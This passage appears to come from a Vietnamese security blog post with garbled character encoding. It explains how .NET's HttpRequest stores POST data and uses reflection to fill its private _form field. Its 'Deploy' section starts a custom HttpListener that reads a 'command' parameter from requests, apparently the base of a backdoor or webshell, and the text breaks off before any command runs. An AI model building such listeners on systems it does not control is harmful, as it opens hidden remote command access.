&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Khi gá»­i mÃ¬nh post Ä‘áº¿n service thÃ¬ chá»‰ nháº­n Ä‘Æ°á»£c thÃ´ng bÃ¡o null, chá»©ng tá» HttpRequest khÃ´ng láº¥y Ä‘Æ°á»£c dá»¯ liá»‡u cá»§a POST body:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SJJrtOorbe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Äáº¿n nÆ°á»›c nÃ y thÃ¬ mÃ¬nh cáº§n Ä‘i vÃ o source Ä‘á»ƒ xem xÃ©t rá»“i. HÃ m xá»­ lÃ½ thá»±c cháº¥t sáº½ Ä‘i qua method EnsureForm dÃ¹ng Ä‘á»ƒ kiá»ƒm tra xem Form cÃ³ há»£p lá»‡ hay khÃ´ng, sau Ä‘Ã³ tráº£ vá» thuá»™c tÃ­nh &lt;code&gt;_form&lt;/code&gt; cá»§a object Ä‘á»ƒ xá»­ lÃ½, tá»« Ä‘Ã³ suy ra thuá»™c tÃ­nh &lt;code&gt;_form&lt;/code&gt; chÃ­nh lÃ  nÆ¡i lÆ°u trá»¯ dá»¯ liá»‡u cá»§a POST body trong má»™t HTTP Request:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/H1yFtOiB-e.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡i Ä‘Ã¢y, EnsureForm check náº¿u thuá»™c tÃ­nh &lt;code&gt;_form&lt;/code&gt; lÃ  null vÃ  thuá»™c tÃ­nh &lt;code&gt;_wr&lt;/code&gt; khÃ¡c null thÃ¬ sáº½ gá»i Ä‘áº¿n FillInFormCollection Ä‘á»ƒ Ä‘iá»n thÃ´ng tin vÃ o form má»›i, cÃ²n náº¿u nhÆ° &lt;code&gt;_wr&lt;/code&gt; lÃ  null thÃ¬ tiáº¿n hÃ nh set thuá»™c tÃ­nh cho form hiá»‡n táº¡i lÃ  Read Only. CÃ²n trong trÆ°á»ng há»£p &lt;code&gt;_form&lt;/code&gt; Ä‘Ã£ tá»“n táº¡i tá»©c khÃ¡c null sáº½ tráº£ vá» &lt;code&gt;_form&lt;/code&gt; Ä‘Ã³ luÃ´n:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BkWptOorZg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tiáº¿p tá»¥c nháº£y vÃ o method FillInFormCollection, Ä‘Ã¢y lÃ  nÆ¡i xá»­ lÃ½ dá»¯ liá»‡u hay Ä‘á»ƒ Ä‘iá»n dá»¯ liá»‡u vÃ o &lt;code&gt;_form&lt;/code&gt;. Do muá»‘n xá»­ lÃ½ kiá»ƒu key-param nÃªn mÃ¬nh chÃº Ã½ Ä‘áº¿n content-type application/x-www-form-urlencoded trÆ°á»›c:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJNf5_orZx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡i Ä‘Ã¢y mÃ¬nh tháº¥y dá»¯ liá»‡u Ä‘Æ°á»£c fill thÃ´ng qua hÃ m FillFromEncodedBytes vá»›i 2 tham sá»‘: : dá»¯ liá»‡u dÆ°á»›i dáº¡ng byte vÃ  loáº¡i encoding.
CÃ²n láº¡i, náº¿u nhÆ° kiá»ƒu content-type lÃ  multipart/form-data, lÃ  dá»¯ liá»‡u Ä‘Æ°á»£c gá»­i lÃªn cÃ³ boundary, thÆ°á»ng Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ upload file thÃ¬ sáº½ cháº¡y vÃ²ng for Ä‘á»ƒ thÃªm giÃ¡ trá»‹ cá»§a tá»«ng tham sá»‘ má»™t trong form theo thá»© tá»±:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B13Y5diH-x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
NhÆ° váº­y, Ä‘á»ƒ cÃ³ thá»ƒ lÆ°u Ä‘Æ°á»£c dá»¯ liá»‡u trong POST body vÃ o &lt;code&gt;_form&lt;/code&gt; thÃ¬ ta cáº§n má»™t trong hai Ä‘iá»u kiá»‡n:
&lt;code&gt;_wr&lt;/code&gt; khÃ¡c null hoáº·c &lt;code&gt;_form&lt;/code&gt; khÃ¡c null.
Xem xÃ©t Ä‘áº¿n kháº£ nÄƒng Ä‘áº§u tiÃªn, &lt;code&gt;_wr&lt;/code&gt; chá»‰ cÃ³ thá»ƒ Ä‘Æ°á»£c set trong quÃ¡ trÃ¬nh khá»Ÿi táº¡o object class HttpRequest. Chá»‰ cÃ³ constructor Ä‘áº§u tiÃªn cÃ³ thá»ƒ chÃ¨n Ä‘Æ°á»£c giÃ¡ trá»‹ vÃ o &lt;code&gt;_wr&lt;/code&gt;, nhÆ°ng chá»‰ cÃ³ constructor thá»© 2 lÃ  public tá»©c cÃ³ thá»ƒ gá»i trá»±c tiáº¿p tá»« public class HttpRequest.
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BJEbs_srZg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Náº¿u váº­y thÃ¬ mÃ¬nh sáº½ Ä‘i theo hÆ°á»›ng thá»© 2, lÃ m cho &lt;code&gt;_form&lt;/code&gt; khÃ¡c null. KhÃ´ng cáº§n pháº£i gÃ¡n thÃ´ng qua viá»‡c khá»Ÿi táº¡o má»™t HttpWorkerRequest mÃ  sá»­ dá»¥ng reflection Ä‘á»ƒ khá»Ÿi táº¡o má»™t object cÃ³ kiá»ƒu dá»¯ liá»‡u HttpValueCollection giá»‘ng &lt;code&gt;_form&lt;/code&gt;, vÃ  tá»« Ä‘Ã³ gá»i Ä‘áº¿n method FillFromEncodedBytes, truyá»n tháº³ng dá»¯ liá»‡u cá»§a body request vÃ o method Ä‘Ã³. Äoáº¡n mÃ£ thá»±c hiá»‡n sáº½ nhÆ° sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;FieldInfo&lt;/span&gt; &lt;span class="n"&gt;field&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;_form&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Instance&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NonPublic&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;formtype&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;field&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FieldType&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;MethodInfo&lt;/span&gt; &lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;formtype&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;FillFromEncodedBytes&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Instance&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NonPublic&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;ConstructorInfo&lt;/span&gt; &lt;span class="n"&gt;constructor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;formtype&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetConstructor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NonPublic&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Instance&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;object&lt;/span&gt; &lt;span class="n"&gt;obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;constructor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;method&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;obj&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;rawData&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ContentEncoding&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;field&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SetValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;obj&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;ThÃªm chá»— nÃ y vÃ o Ä‘oáº¡n code test vÃ  á»‘p nguyÃªn request trÆ°á»›c, láº§n nÃ y thÃ¬ mÃ¬nh Ä‘Ã£ láº¥y Ä‘Æ°á»£c value cho param test:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/ryYFi_oHZe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id="deploy-1"&gt;Deploy
&lt;/h3&gt;&lt;p&gt;Äoáº¡n code mÃ¬nh táº¡o má»™t HTTPListener, chá»‰ thÃªm pháº§n xá»­ lÃ½ Ä‘áº§u vÃ o vÃ  hiá»ƒn thá»‹ ra ngoÃ i thÃ´i:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;span class="lnt"&gt;33
&lt;/span&gt;&lt;span class="lnt"&gt;34
&lt;/span&gt;&lt;span class="lnt"&gt;35
&lt;/span&gt;&lt;span class="lnt"&gt;36
&lt;/span&gt;&lt;span class="lnt"&gt;37
&lt;/span&gt;&lt;span class="lnt"&gt;38
&lt;/span&gt;&lt;span class="lnt"&gt;39
&lt;/span&gt;&lt;span class="lnt"&gt;40
&lt;/span&gt;&lt;span class="lnt"&gt;41
&lt;/span&gt;&lt;span class="lnt"&gt;42
&lt;/span&gt;&lt;span class="lnt"&gt;43
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;public&lt;/span&gt; &lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="n"&gt;void&lt;/span&gt; &lt;span class="n"&gt;CustomListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;HttpListener&lt;/span&gt; &lt;span class="n"&gt;listener&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;HttpListener&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;listener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Prefixes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;listener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;listener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsListening&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;HttpListenerContext&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;listener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetContext&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;HttpListenerRequest&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;HttpListenerResponse&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Stream&lt;/span&gt; &lt;span class="n"&gt;stm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;try&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;StreamReader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;InputStream&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ContentEncoding&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadToEnd&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;byte&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="n"&gt;rawData&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Encoding&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Default&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;HttpRequest&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;HttpRequest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Url&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ToString&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;QueryString&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ToString&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;FieldInfo&lt;/span&gt; &lt;span class="n"&gt;field&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetType&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;_form&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Instance&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NonPublic&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Type&lt;/span&gt; &lt;span class="n"&gt;formtype&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;field&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FieldType&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;MethodInfo&lt;/span&gt; &lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;formtype&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetMethod&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;FillFromEncodedBytes&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Instance&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NonPublic&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;ConstructorInfo&lt;/span&gt; &lt;span class="n"&gt;constructor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;formtype&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GetConstructor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NonPublic&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;BindingFlags&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Instance&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;Type&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;object&lt;/span&gt; &lt;span class="n"&gt;obj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;constructor&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;method&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Invoke&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;obj&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;rawData&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ContentEncoding&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;field&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SetValue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;obj&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Form&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;command&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
